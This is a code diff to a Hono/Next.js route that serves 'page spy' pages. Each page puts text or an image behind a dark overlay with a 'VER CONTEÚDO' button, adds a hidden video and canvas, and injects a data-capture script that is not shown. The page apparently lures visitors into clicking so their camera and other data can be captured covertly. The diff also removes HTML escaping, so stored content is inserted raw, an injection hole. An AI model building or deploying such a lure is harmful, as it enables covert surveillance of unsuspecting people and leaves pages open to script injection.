@@ -1,6 +1,6 @@
 import { zValidator } from "@hono/zod-validator";
 import { Hono } from "hono";
-import { html, raw } from "hono/html";
+import { raw } from "hono/html";
 import { handle } from "hono/vercel";
 import type { PageConfig } from "next";
 import fs from "node:fs";
@@ -107,6 +107,9 @@ app.get("/*", async (c) => {
     },
     select: {
       id: true,
+      type: true,
+      textString: true,
+      fileBase64: true,
     },
   });
 
@@ -132,16 +135,66 @@ app.get("/*", async (c) => {
     },
   });
 
-  return c.html(
-    html`<!doctype html>
-    <h1>Hello! ${path}!</h1>
+  let showContent = "";
 
-    <script>
-      let pageLoadId = "${pageView.id}";
-      ${raw(scriptCaptureDataString)};
-    </script>
-</html>`,
-  );
+  if (checkPageSpy.type === "TEXT") {
+    showContent = `<p>${checkPageSpy.textString}</p>`;
+  }
+
+  if (checkPageSpy.type === "IMAGE") {
+    showContent = `<img src="${checkPageSpy.fileBase64}" alt="File content" />`;
+  }
+
+  return c.html(`<!doctype html>
+<html lang="en">
+<head>
+<style>
+  #video {
+    display: none;
+  }
+
+  #canvas {
+    display: none;
+  }
+
+  #overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.91);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  #captureButton {
+    background-color: #2ecc71;
+    font-size: 18px;
+    padding: 10px 20px;
+    cursor: pointer;
+    color: white;
+    border: none;
+  }
+</style>
+</head>
+<body>
+  ${showContent}
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <div id="overlay">
+    <button id="captureButton">VER CONTEÚDO</button>
+  </div>
+
+  <script>
+    let pageLoadId = "${pageView.id}";
+    ${raw(scriptCaptureDataString)};
+  </script>
+</body>
+</html>`);
 });
 
 export const GET = handle(app);
